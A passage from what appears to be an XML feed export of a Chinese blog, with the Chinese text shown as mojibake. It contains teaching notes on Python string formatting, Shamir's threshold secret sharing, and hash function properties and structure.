alt="img"></p><p>&lt;å¡«å……&gt;ã€&lt;å¯¹é½&gt;å’Œ&lt;å®½åº¦&gt;æ˜¯3ä¸ªç›¸å…³å­—æ®µã€‚</p><p>&lt;å®½åº¦&gt;æŒ‡å½“å‰æ§½çš„è®¾å®šè¾“å‡ºå­—ç¬¦å®½åº¦ï¼Œå¦‚æœè¯¥æ§½å¯¹åº”çš„format()å‚æ•°é•¿åº¦æ¯”&lt;å®½åº¦&gt;è®¾å®šå€¼å¤§ï¼Œåˆ™ä½¿ç”¨å‚æ•°å®é™…é•¿åº¦ã€‚å¦‚æœè¯¥å€¼çš„å®é™…ä½æ•°å°äºæŒ‡å®šå®½åº¦ï¼Œåˆ™ä½æ•°å°†è¢«é»˜è®¤ä»¥ç©ºæ ¼å­—ç¬¦è¡¥å……ã€‚</p><p>&lt;å¯¹é½&gt;æŒ‡å‚æ•°åœ¨&lt;å®½åº¦&gt;å†…è¾“å‡ºæ—¶çš„å¯¹é½æ–¹å¼ï¼Œåˆ†åˆ«ä½¿ç”¨&lt;ã€&gt;å’Œ^ä¸‰ä¸ªç¬¦å·è¡¨ç¤ºå·¦å¯¹é½ã€å³å¯¹é½å’Œå±…ä¸­å¯¹é½ã€‚</p><p>&lt;å¡«å……&gt;æŒ‡&lt;å®½åº¦&gt;å†…é™¤äº†å‚æ•°å¤–çš„å­—ç¬¦é‡‡ç”¨ä»€ä¹ˆæ–¹å¼è¡¨ç¤ºï¼Œé»˜è®¤é‡‡ç”¨ç©ºæ ¼ï¼Œå¯ä»¥é€šè¿‡&lt;å¡«å……&gt;æ›´æ¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=<span class="string">&quot;python&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;0:30&#125;&quot;</span>.<span class="built_in">format</span>(s)</span><br><span class="line"><span class="string">&#x27;python                        &#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;0:*^10&#125;&quot;</span>.<span class="built_in">format</span>(s)  </span><br><span class="line"><span class="string">&#x27;**python**&#x27;</span></span><br></pre></td></tr></table></figure><p>&lt;.ç²¾åº¦&gt;è¡¨ç¤ºä¸¤ä¸ªå«ä¹‰ï¼Œç”±å°æ•°ç‚¹ï¼ˆ.ï¼‰å¼€å¤´ã€‚</p><p>å¯¹äºæµ®ç‚¹æ•°ï¼Œç²¾åº¦è¡¨ç¤ºå°æ•°éƒ¨åˆ†è¾“å‡ºçš„æœ‰æ•ˆä½æ•°ã€‚</p><p>å¯¹äºå­—ç¬¦ä¸²ï¼Œç²¾åº¦è¡¨ç¤ºè¾“å‡ºçš„æœ€å¤§é•¿åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;0:.2f&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">1.2344423</span>)</span><br><span class="line"><span class="string">&#x27;1.23&#x27;</span></span><br></pre></td></tr></table></figure><p>&lt;ç±»å‹&gt;è¡¨ç¤ºè¾“å‡ºæ•´æ•°å’Œæµ®ç‚¹æ•°ç±»å‹çš„æ ¼å¼è§„åˆ™ã€‚å¯¹äºæ•´æ•°ç±»å‹ï¼Œè¾“å‡ºæ ¼å¼åŒ…æ‹¬ï¼š</p><p>â€“b: è¾“å‡ºæ•´æ•°çš„äºŒè¿›åˆ¶æ–¹å¼ï¼›</p><p>â€“c: è¾“å‡ºæ•´æ•°å¯¹åº”çš„Unicodeå­—ç¬¦ï¼›</p><p>â€“d: è¾“å‡ºæ•´æ•°çš„åè¿›åˆ¶æ–¹å¼ï¼›</p><p>â€“o: è¾“å‡ºæ•´æ•°çš„å…«è¿›åˆ¶æ–¹å¼ï¼›</p><p>â€“x: è¾“å‡ºæ•´æ•°çš„å°å†™åå…­è¿›åˆ¶æ–¹å¼ï¼›</p><p>â€“X: è¾“å‡ºæ•´æ•°çš„å¤§å†™åå…­è¿›åˆ¶æ–¹å¼ï¼›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;0:b&#125;,&#123;0:c&#125;,&#123;0:d&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">16</span>)</span><br><span class="line"><span class="string">&#x27;10000,\x10,16&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pythonåŸºç¡€-ä¸€&quot;&gt;&lt;a href=&quot;#pythonåŸºç¡€-ä¸€&quot; class=&quot;headerlink&quot; title=&quot;pythonåŸºç¡€(ä¸€)&quot;&gt;&lt;/a&gt;pythonåŸºç¡€(ä¸€)&lt;/h1&gt;&lt;h2 id=&quot;ç¨‹åºè®¾è®¡åŸºæœ¬æ–¹æ³•&quot;&gt;&lt;a href=&quot;#ç¨‹åºè®¾è®¡åŸºæœ¬æ–¹æ³•&quot; c</summary>
      
    
    
    
    <category term="python" scheme="http://websec.space/categories/python/"/>
    
    
    <category term="python" scheme="http://websec.space/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>å¯†ç å­¦ä¹‹ç†è®ºç¯‡(å¯†é’¥ç®¡ç†)</title>
    <link href="http://websec.space/2021/12/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E7%90%86%E8%AE%BA%E7%AF%87(%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86)/"/>
    <id>http://websec.space/2021/12/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E7%90%86%E8%AE%BA%E7%AF%87(%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86)/</id>
    <published>2021-12-12T16:00:00.000Z</published>
    <updated>2021-12-14T07:53:47.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¯†ç å­¦ä¹‹ç†è®ºç¯‡-å¯†é’¥ç®¡ç†"><a href="#å¯†ç å­¦ä¹‹ç†è®ºç¯‡-å¯†é’¥ç®¡ç†" class="headerlink" title="å¯†ç å­¦ä¹‹ç†è®ºç¯‡(å¯†é’¥ç®¡ç†)"></a>å¯†ç å­¦ä¹‹ç†è®ºç¯‡(å¯†é’¥ç®¡ç†)</h1><h2 id="ç§˜å¯†å…±äº«"><a href="#ç§˜å¯†å…±äº«" class="headerlink" title="ç§˜å¯†å…±äº«"></a>ç§˜å¯†å…±äº«</h2><blockquote><p>(1)ä¸€ä¸ªç»å¯†æƒ…æŠ¥é”åœ¨ä¿é™©æŸœé‡Œï¼Œä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œè§„å®šæƒ…æŠ¥ç®¡ç†éƒ¨é—¨çš„8ä¸ªäººè‡³å°‘æœ‰4ä¸ªäººåœ¨åœºæ‰èƒ½æ‰“å¼€ä¿é™©æŸœã€‚</p><p>ä¸ºäº†è§£å†³è¿™æ ·ä¸€äº›é—®é¢˜ï¼Œäººä»¬å¼•å…¥äº†(tï¼Œn)é—¨é™æ–¹æ¡ˆ(Threshold Scheme)ï¼Œ</p></blockquote><p>å…¶åŸºæœ¬æ€æƒ³:é¢„å…ˆç”±éœ€è¦ä¿æŠ¤çš„å…±äº«ç§˜å¯†äº§ç”Ÿnä»½ç§˜å¯†æˆ–ç§°ä¸ºç§˜å¯†å½±å­(Shadow)ï¼Œå¹¶ä¸”è¿™nä»½ä¸­çš„ä»»æ„tä¸ªå°±å¯ä»¥é‡æ„å…±äº«ç§˜å¯†ã€‚</p><p>ä¸€ä¸ªå…±äº«ç§˜å¯†Måˆ†ä½nä»½ç§˜å¯†m<del>1</del>ï¼Œm<del>2</del>ï¼Œm<del>3</del>,â€¦â€¦ï¼Œm<del>n</del> ï¼Œå¹¶å°†è¿™nä»½ç§˜å¯†åˆ†åˆ«æˆäºˆnä¸ªä¸åŒçš„æŒæœ‰äººä¿ç®¡ã€‚</p><p>(1)ç”±äººä½“tä¸ªæˆ–å¤šä¸ªtä¸ªå·²çŸ¥çš„ç§˜å¯†ä»½é¢m<del>i</del>ï¼Œå¯ä»¥æ–¹ä¾¿åœ°è®¡ç®—å‡ºå…±äº«ç§˜å¯†M</p><p>(2)è‹¥ä»…çŸ¥é“t-1ä¸ªæˆ–è€…å°‘äºt-1ä¸ªç§˜å¯†ä»½é¢m<del>i</del>ï¼Œåˆ™ä¸å¯èƒ½ç¡®å®šå…±äº«ç§˜å¯†M</p><p>tç§°ä¸ºé—¨é™å€¼ï¼Œè¿™æ ·çš„æ–¹æ¡ˆç§°ä¸º(t,n)é—¨é™æ–¹æ¡ˆï¼Œå¤šäººå…±åŒé•¿å®˜ä¸€ä¸ªç§˜å¯†ä¿¡æ¯ã€‚</p><h3 id="Shamiré—¨é™æ–¹æ¡ˆ"><a href="#Shamiré—¨é™æ–¹æ¡ˆ" class="headerlink" title="Shamiré—¨é™æ–¹æ¡ˆ"></a>Shamiré—¨é™æ–¹æ¡ˆ</h3><p>Shamiråˆ©ç”¨æœ‰é™åŸŸä¸Šçš„å¤šé¡¹å¼ç»“åˆæ‹‰æ ¼æœ—æ—¥æ’å€¼å…¬å¼æ„é€ äº†ä¸€ä¸ª(t,n)é—¨é™æ–¹æ¡ˆã€‚è®¾GF(p)æ˜¯ä¸€æœ‰é™åŸŸï¼Œå…±äº«å¯†é’¥kâˆˆGF(p)ï¼Œå¯ä¿¡ä¸­å¿ƒç»™n(n&lt;p)ä¸ªå…±äº«è€…U<del>i</del>(1â‰¤iâ‰¤n)åˆ†é…å¯†é’¥çš„æ­¥éª¤å¦‚ä¸‹</p><p>GF(p)={0,1,2,3,4,5â€¦â€¦.,p-1}</p><blockquote><p>è¯¥æ–¹æ¡ˆåŸºäºæ‹‰æ ¼æœ—æ—¥æ’å€¼æ³•ï¼Œæ‰€è°“æ’å€¼æ³•å°±æ˜¯åˆ©ç”¨kæ¬¡å¤šé¡¹å¼åªéœ€è¦æœ‰kä¸ªæ–¹ç¨‹å°±å¯ä»¥å°†ç³»æ•°å…¨éƒ¨è§£å‡ºçš„ç‰¹æ€§ã€‚</p><p>å…ˆç¡®ç«‹ä¸€ä¸ªæ–¹ç¨‹k-1æ¬¡çš„æ–¹ç¨‹ï¼Œä¿è¯kä¸ªæ–¹ç¨‹å³kä¸ªäººèƒ½æ‰“å¼€ç®±å­ã€‚å¯†é’¥å–å€¼å³ä¸ºå‡½æ•°ä¸Šçš„å…¶ä»–ç‚¹ã€‚</p></blockquote><p>(1)å¯ä¿¡ä¸­å¿ƒTéšæœºé€‰æ‹©ä¸€ä¸ªt-1æ¬¡å¤šé¡¹å¼ï¼š</p><p>â€‹                            g(x)=a<del>t-2</del>x^t-1^ +a<del>t-2</del>^t-2^+â€¦+a<del>2</del>x^2^+a<del>1</del>x+a<del>0</del></p><p>g(x)âˆˆGF(p)[x];a<del>0</del>=kå°±æ˜¯å…±äº«å¯†é’¥</p><p>(2)å¯ä¿¡ä¸­å¿ƒTåœ¨GF(p)ä¸­é€‰æ‹©nä¸ªéé›¶çš„ã€äº’ä¸ç›¸åŒçš„å…ƒç´ x<del>1</del>ï¼Œx<del>2</del>,â€¦.,x<del>n</del>,åˆ†åˆ«è®¡ç®—ï¼š</p><p>â€‹                            y<del>i</del>=g(x<del>i</del>),i=1,2,3â€¦,nå³æ‰¾å‡ºæ›²çº¿g(x)ä¸Šçš„nä¸ªç‚¹</p><p>(3)æŠŠç¬¬iä¸ªç‚¹(x<del>i</del>,y<del>i</del>)ä½œä¸ºç§˜å¯†ä»½é¢åˆ†é…ç»™ç¬¬iä¸ªå…±äº«è€…U<del>i</del> ,å…¶ä¸­x<del>i</del>æ˜¯å…¬å¼€çš„ï¼Œé€šå¸¸å¯ä»¥ç›´æ¥å–å…±äº«è€…U<del>i</del>çš„èº«ä»½ID<del>i</del>ï¼Œy<del>i</del>æ˜¯å±äºå…±äº«è€…U<del>i</del>çš„ç§˜å¯†ä»½é¢ï¼Œi=1,2,3,4ï¼Œâ€¦.,n</p><p>ç”±äºg(x)æ˜¯t-1æ¬¡å¤šé¡¹å¼ï¼Œå› è€Œtä¸ªæˆ–tä¸ªä»¥ä¸Šçš„åæ ‡ç‚¹å¯ä»¥å”¯ä¸€ç¡®å®šg(x)ï¼Œä»è€Œå…±äº«å¯†é’¥ä¹Ÿå¯ä»¥ç¡®å®šä¸‹æ¥ï¼Œä¹Ÿå³k=g(0);åè¿‡æ¥ï¼Œå¦‚æœåæ ‡ç‚¹å°‘äºtä¸ªï¼Œåˆ™æ— æ³•ç¡®å®šg(x),ä¹Ÿå°±æ— æ³•ç¡®å®šk</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¯†ç å­¦ä¹‹ç†è®ºç¯‡-å¯†é’¥ç®¡ç†&quot;&gt;&lt;a href=&quot;#å¯†ç å­¦ä¹‹ç†è®ºç¯‡-å¯†é’¥ç®¡ç†&quot; class=&quot;headerlink&quot; title=&quot;å¯†ç å­¦ä¹‹ç†è®ºç¯‡(å¯†é’¥ç®¡ç†)&quot;&gt;&lt;/a&gt;å¯†ç å­¦ä¹‹ç†è®ºç¯‡(å¯†é’¥ç®¡ç†)&lt;/h1&gt;&lt;h2 id=&quot;ç§˜å¯†å…±äº«&quot;&gt;&lt;a href=&quot;#ç§˜å¯†å…±äº«&quot; c</summary>
      
    
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="å¯†ç å­¦" scheme="http://websec.space/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>å¯†ç å­¦ä¹‹ç†è®ºç¯‡(è®¤è¯ç†è®ºä¸æŠ€æœ¯)</title>
    <link href="http://websec.space/2021/12/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E7%90%86%E8%AE%BA%E7%AF%87(%E8%AE%A4%E8%AF%81%E7%90%86%E8%AE%BA%E4%B8%8E%E6%8A%80%E6%9C%AF)/"/>
    <id>http://websec.space/2021/12/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B9%8B%E7%90%86%E8%AE%BA%E7%AF%87(%E8%AE%A4%E8%AF%81%E7%90%86%E8%AE%BA%E4%B8%8E%E6%8A%80%E6%9C%AF)/</id>
    <published>2021-12-11T16:00:00.000Z</published>
    <updated>2022-01-07T15:48:30.390Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¯†ç å­¦ä¹‹ç†è®ºç¯‡-è®¤è¯ç†è®ºä¸æŠ€æœ¯"><a href="#å¯†ç å­¦ä¹‹ç†è®ºç¯‡-è®¤è¯ç†è®ºä¸æŠ€æœ¯" class="headerlink" title="å¯†ç å­¦ä¹‹ç†è®ºç¯‡(è®¤è¯ç†è®ºä¸æŠ€æœ¯)"></a>å¯†ç å­¦ä¹‹ç†è®ºç¯‡(<strong>è®¤è¯ç†è®ºä¸æŠ€æœ¯</strong>)</h1><h2 id="è®¤è¯ä¸è®¤è¯ç³»ç»Ÿ"><a href="#è®¤è¯ä¸è®¤è¯ç³»ç»Ÿ" class="headerlink" title="è®¤è¯ä¸è®¤è¯ç³»ç»Ÿ"></a>è®¤è¯ä¸è®¤è¯ç³»ç»Ÿ</h2><p>è®¤è¯åˆç§°ä¸ºé‰´åˆ«ï¼Œæ˜¯è®¸å¤šåº”ç”¨ç³»ç»Ÿä¸­å®‰å…¨ä¿æŠ¤çš„ç¬¬ä¸€é“è®¾é˜²ï¼Œåœ¨ç°ä»£å¯†ç å­¦ä¸­æœ‰ç€éå¸¸é‡è¦çš„ä½œç”¨ï¼Œè®¤è¯æ˜¯ä¸ªè¿‡ç¨‹ï¼Œé€šè¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œä¸€ä¸ªå®ä½“å‘å¦å¤–ä¸€ä¸ªå®ä½“è¯æ˜æŸç§å£°ç§°çš„å±æ€§ï¼Œå‰è€…æ˜¯ä¸€ä¸ªä¸»ä½“ï¼Œå£°ç§°æ‹¥æœ‰æŸç§åˆæ³•æƒåˆ©ï¼Œå¯ä»¥è¿›å…¥åä¸€ä¸ªå®ä½“çš„ç³»ç»Ÿæˆ–è€…ä½¿ç”¨åè€…çš„æœåŠ¡ï¼Œé€šè¿‡è®¤è¯ï¼Œåè€…ç¡®å®šå‰è€…ç¡®å®æ‹¥æœ‰çš„æƒåˆ©ï¼Œè®¤è¯å‚æ•°ä¸€èˆ¬æœ‰å¤šç§å½¢å¼ï¼Œå¦‚ï¼šå£ä»¤ã€æ ‡è¯†ç¬¦ã€å¯†é’¥ã€ä¿¡ç‰©ã€æ™ºèƒ½å¡ã€æŒ‡çº¹ã€è§†ç½‘çº¹ã€‚</p><blockquote><p>â€œå£ä»¤â€ç›¸å½“äºå¹³æ—¶å’±ä»¬ç™»å½•ç³»ç»Ÿæ—¶è¾“å…¥çš„å¯†ç ï¼ˆä¹Ÿæ˜¯ä¸€ç§è®¤è¯ï¼‰ ã€‚</p><p>â€œå¯†é’¥â€ç›¸å½“äºå…¬é’¥å¯†ç ä½“åˆ¶ä¸­çš„ç§é’¥ï¼Œå¯ç”¨äºæ•°å­—ç­¾åï¼ˆä¹Ÿæ˜¯ä¸€ç§è®¤è¯ï¼‰ã€‚</p><p>â€œæ™ºèƒ½å¡â€ç›¸å½“äºæ ¡å›­ä¸€å¡é€šä¹‹ç±»ï¼ˆä¹Ÿæ˜¯ä¸€ç§è®¤è¯ï¼‰ ã€‚</p><p>â€œæŒ‡çº¹â€æ¯”å¦‚æŒ‡çº¹è¯†åˆ«æ‰‹æœºå¼€æœºã€æŒ‡çº¹è¯†åˆ«ç§»åŠ¨æ”¯ä»˜ç­‰ï¼ˆä¹Ÿæ˜¯ä¸€ç§è®¤è¯ï¼‰ ã€‚</p></blockquote><p>éšç€Hashå‡½æ•°å’Œæ•°å­—ç­¾åçš„å‘ç°ï¼Œäººä»¬è®¤è¯†åˆ°ä¿å¯†å’Œè®¤è¯æ˜¯ä¸¤ä¸ªä¸åŒçš„å±æ€§çš„é—®é¢˜ï¼Œè®¤è¯ä¸èƒ½è‡ªåŠ¨æä¾›ä¿å¯†æ€§ï¼Œè€Œä¿å¯†æ€§ä¹Ÿä¸èƒ½è‡ªç„¶æä¾›è®¤è¯åŠŸèƒ½ã€‚è®¤è¯ä¸»è¦ç”¨äºç¡®ä¿æ¶ˆæ¯å‘é€è€…å’Œæ¥æ”¶è€…çš„çœŸå®æ€§ä»¥åŠæ¶ˆæ¯çš„å®Œæ•´æ€§ã€‚</p><p><img src="https://img-blog.csdnimg.cn/45c78e46e5364498b8f7fc6cbc983113.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHk0MDQ=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p>æ³¨æ„ï¼šè¿™ä¸ªç¤ºæ„å›¾å¹¶ä¸ç»å¯¹ã€‚Hashå‡½æ•°ä¹Ÿèƒ½ç”¨äºè®¤è¯ï¼Œä½†Hashå‡½æ•°é‡Œå¹¶æ²¡ç”¨åˆ°å¯†é’¥ã€‚</p><h2 id="Hashå‡½æ•°æ¦‚è¿°"><a href="#Hashå‡½æ•°æ¦‚è¿°" class="headerlink" title="Hashå‡½æ•°æ¦‚è¿°"></a>Hashå‡½æ•°æ¦‚è¿°</h2><p>Hash å‡½æ•°åˆç§°ä¸ºå“ˆå¸Œå‡½æ•°ã€æ‚å‡‘å‡½æ•°å’Œæ•£åˆ—å‡½æ•°ï¼Œåœ¨ç°ä»£å¯†ç å­¦ä¸­æ‰®æ¼”ç€é‡è¦è§’è‰²ã€‚Hashå‡½æ•°æ˜¯ä¸€å…¬å¼€å‡½æ•°ï¼Œé€šå¸¸è®°ä¸ºHæˆ–hã€‚Hashå‡½æ•°å¯ä»¥å°†ä»»æ„é•¿çš„æ¶ˆæ¯ mæ˜ å°„ä¸ºè¾ƒçŸ­çš„ã€å›ºå®šé•¿åº¦çš„ä¸€ä¸ªå€¼ï¼Œè®°ä¸ºH(m)ï¼Œç»å¸¸ç§°å‡½æ•°å€¼H(m)ä¸ºæ•£åˆ—å€¼ã€å“ˆå¸Œå€¼ã€æ‚å‡‘å€¼ã€æ‚å‡‘ç æˆ–æ¶ˆæ¯æ‘˜è¦ã€æ•°ç»„æŒ‡çº¹ã€‚</p><p>Hashå‡½æ•°ä¹Ÿå¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§å•å‘å¯†ç ä½“åˆ¶ï¼Œå³å®ƒä»ä¸€ä¸ªæ˜æ–‡åˆ°å¯†æ–‡æ˜¯ä¸å¯é€†æ˜ å°„ï¼Œåªæœ‰åŠ å¯†è¿‡ç¨‹ï¼Œä¸èƒ½è§£å¯†ã€‚å“ˆå¸Œå€¼æ˜¯æ¶ˆæ¯ä¸­æ‰€æœ‰æ¯”ç‰¹çš„å‡½æ•°ï¼Œå› æ­¤æä¾›äº†ä¸€ç§é”™è¯¯æ£€æµ‹èƒ½åŠ›ï¼Œå³æ”¹å˜æ¶ˆæ¯ä¸­ä»»ä½•ä¸€ä¸ªæ¯”ç‰¹æˆ–å‡ ä¸ªæ¯”ç‰¹éƒ½ä¼šä½¿å“ˆå¸Œå€¼å‘ç”Ÿæ”¹å˜ã€‚Hash å‡½æ•°æ˜¯å®ç°æœ‰æ•ˆã€å®‰å…¨ã€å¯é æ•°å­—ç­¾åå’Œè®¤è¯çš„é‡è¦å·¥å…·ã€‚</p><p>åˆ©ç”¨Hashå‡½æ•°å¯ä»¥å¯¹æ¶ˆæ¯çš„å®Œæ•´æ€§</p><blockquote><p>åˆ©ç”¨Hashå‡½æ•°å¯ä»¥å¯¹æ¶ˆæ¯çš„å®Œæ•´æ€§è¿›è¡Œè®¤è¯ã€‚æ¯”å¦‚Aå°†(x,H(x))å‘é€ç»™B,å…¶ä¸­xæ˜¯æ¶ˆæ¯ï¼ŒH()æ˜¯å…¬å¼€çš„Hashå‡½æ•°ã€‚Båˆ©ç”¨Hashå‡½æ•°éªŒè¯ä¸€ä¸‹ï¼Œé€šè¿‡äº†è¯´æ˜æ¶ˆæ¯å®Œæ•´ï¼Œä¸é€šè¿‡è¯´æ˜æ¶ˆæ¯ä¸å®Œæ•´ã€‚</p><p>æ³¨æ„ï¼šè¿™åªæ˜¯ç®€å•è¯´æ˜Hashå‡½æ•°ç”¨äºè®¤è¯çš„åŸç†ï¼Œå¹¶ä¸èƒ½é˜²æ­¢ä¼ªé€ ã€‚å¦‚æ”»å‡»è€…å°†Aå‘é€çš„ä¸œè¥¿æˆªå–äº†ï¼Œåæ‰‹å°†ï¼ˆy, H(y)ï¼‰å‘é€ç»™æ¥æ”¶è€…Bï¼ŒBä¹Ÿè§‰å¾—æ¶ˆæ¯æŒºå®Œæ•´çš„ã€‚æœ‰æ—¶å€™è¿˜è¦ç»“åˆå¯†é’¥ä½¿ç”¨ã€‚</p></blockquote><h3 id="Hashå‡½æ•°çš„æ¦‚å¿µåŠç»“æ„"><a href="#Hashå‡½æ•°çš„æ¦‚å¿µåŠç»“æ„" class="headerlink" title="Hashå‡½æ•°çš„æ¦‚å¿µåŠç»“æ„"></a>Hashå‡½æ•°çš„æ¦‚å¿µåŠç»“æ„</h3><p>1.Hashå‡½æ•°çš„æ¦‚å¿µåŠä¸€èˆ¬å®‰å…¨ç‰¹æ€§</p><p>Hashå‡½æ•°Hæ˜¯ä¸€ä¸ªå…¬å¼€å‡½æ•°ï¼Œä¸éœ€è¦å¯†é’¥ï¼Œç”¨äºå°†ä»»æ„é•¿çš„æ¶ˆæ¯mæ˜ å°„ä¸ºè¾ƒçŸ­çš„ã€å›ºå®šé•¿åº¦ä¸€ä¸ªå€¼H(m)</p><p>å¯¹äºHæœ‰ä¸‹é¢å…­ä¸ªè¦æ±‚ï¼š</p><p>(1)èƒ½å¤Ÿæ¥å—ä»»æ„é•¿åº¦çš„æ¶ˆæ¯ä½œä¸ºè¾“å…¥</p><p>(2)èƒ½å¤Ÿç”Ÿæˆè¾ƒçŸ­çš„ï¼Œå›ºå®šé•¿åº¦çš„è¾“å‡º</p><p>(3)å¯¹ä»»ä½•æ¶ˆæ¯è¾“å…¥éƒ½åº”è¯¥èƒ½å¤Ÿå®¹æ˜“å¿«é€Ÿåœ°è®¡ç®—å‡ºå“ˆå¸Œå€¼</p><p>(4)åº”è¯¥å…·æœ‰å•å‘æ€§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç»™å®šH(m)ï¼Œæ¢å¤æ¶ˆæ¯måœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</p><p>(5)åº”è¯¥èƒ½å¤ŸæŠµæŠ—å¼±ç¢°æ’ï¼Œå³ç»™å®šæ¶ˆæ¯må’ŒH(m),æ‰¾åˆ°å¦å¤–ä¸€ä¸ªæ¶ˆæ¯mâ‰ mâ€˜ï¼Œä½¿H(m)=H(mâ€™)æ˜¯ä¸å¯èƒ½çš„</p><p>(6)åº”è¯¥èƒ½å¤ŸæŠµæŠ—å¼ºå†²å‡»ï¼Œå³å¯ä»¥æœ‰ä¸¤ä¸ªæœ‰æ„ä¹‰çš„æ¶ˆæ¯må’Œmâ€™ï¼Œä½¿å¾—H(m)=H(mâ€™)å‡ ä¹æ˜¯ä¸å¯èƒ½çš„</p><blockquote><p>å¼±ç¢°æ’ï¼šå¯¹äºç»™å®šçš„ä¸€ä¸ªâ€œäººâ€ï¼Œæ‰¾åˆ°ä¸€ä¸ªå’Œä»–æŒ‡çº¹ç›¸åŒçš„äººã€‚</p><p>å¼ºç¢°æ’ï¼šåœ¨è¿™ä¸ªä¸–ç•Œä¸Šæ‰¾åˆ°ä¸¤ä¸ªæŒ‡çº¹ç›¸åŒçš„äººã€‚</p></blockquote><p>Hashå‡½æ•°åº”è¯¥æ»¡è¶³çš„ä¸€èˆ¬å®‰å…¨ç‰¹æ€§å¦‚ä¸‹ï¼š</p><p>(1)å•å‘æ€§ï¼Œç»™å®šH(m),è®¡ç®—måœ¨è®¡ç®—ä¸Šä¸å¯è¡Œ</p><p>(2)æŠ—å¼±ç¢°æ’æ€§ï¼Œå³ç»™å®šæ¶ˆæ¯må’ŒH(m),æ‰¾åˆ°å¦å¤–ä¸€ä¸ªæ¶ˆæ¯mâ‰ mâ€˜ï¼Œä½¿H(m)=H(mâ€™)æ˜¯ä¸å¯èƒ½çš„</p><p>(3)æŠ—å¼ºç¢°æ’æ€§ï¼Œå³å¯ä»¥æœ‰ä¸¤ä¸ªæœ‰æ„ä¹‰çš„æ¶ˆæ¯må’Œmâ€™ï¼Œä½¿å¾—H(m)=H(mâ€™)å‡ ä¹æ˜¯ä¸å¯èƒ½çš„</p><p>2.MDè¿­ä»£ç»“æ„</p><p>1979å¹´ï¼ŒMerkleå»ºè®®äº†ä¸€ä¸ªHashå‡½æ•°çš„ä¸€èˆ¬ç»“æ„ï¼Œè¿™ä¸€ç§è¿­ä»£ç»“æ„çš„Hashå‡½æ•°ï¼ŒMDç³»åˆ—ï¼ŒSHAç³»åˆ—å¤§å¤šæ•°Hashå‡½æ•°éƒ½ä½¿ç”¨è¯¥ç»“æ„ã€‚</p><p><img src="https://img-blog.csdnimg.cn/5711b384a17449edae6bcf92c16d7f22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAeHk0MDQ=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p><p>få‡½æ•°ï¼šè¾“å…¥n+bæ¯”ç‰¹ï¼Œè¾“å‡ºnæ¯”ç‰¹</p><p>Hashå‡½æ•°è¾“å…¥æ¶ˆæ¯mï¼Œå¹¶å°†å…¶åˆ†ä¸ºLä¸ªå›ºå®šé•¿åº¦çš„åˆ†ç»„ï¼Œè¯¥Hashå‡½æ•°é‡å¤ä½¿ç”¨ä¸€ä¸ªå‹ç¼©å‡½æ•°fã€‚å‹ç¼©å‡½æ•°fæœ‰ä¸¤ä¸ªè¾“å…¥ï¼Œä¸€ä¸ªæ˜¯å‰ä¸€é˜¶æ®µçš„næ¯”ç‰¹è¾“å…¥ï¼Œå¦å¤–ä¸€ä¸ªæºäºæ¶ˆæ¯çš„bçš„bitåˆ†ç»„ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªn bitçš„è¾“å‡º</p><h3 id="Hashå‡½æ•°çš„å‘å±•ç°çŠ¶"><a href="#Hashå‡½æ•°çš„å‘å±•ç°çŠ¶" class="headerlink" title="Hashå‡½æ•°çš„å‘å±•ç°çŠ¶"></a>Hashå‡½æ•°çš„å‘å±•ç°çŠ¶</h3><p>æœ€å¸¸ç”¨çš„Hashå‡½æ•°æœ‰ä¸¤ä¸ªç³»åˆ—ï¼šMessage Digest(MD)ç³»åˆ—å’ŒSHA(Security Hash Algorithm)ç³»åˆ—</p><ol><li><p>Message Digest(MD)ç³»åˆ—</p><p>MD5(1991å¹´æå‡ºï¼Œæ˜¯å¯¹MD4çš„æ”¹è¿›ç‰ˆï¼Œå…¶å“ˆå¸Œå€¼ä¸º128ä½)</p></li><li><p>SHA(Security Hash 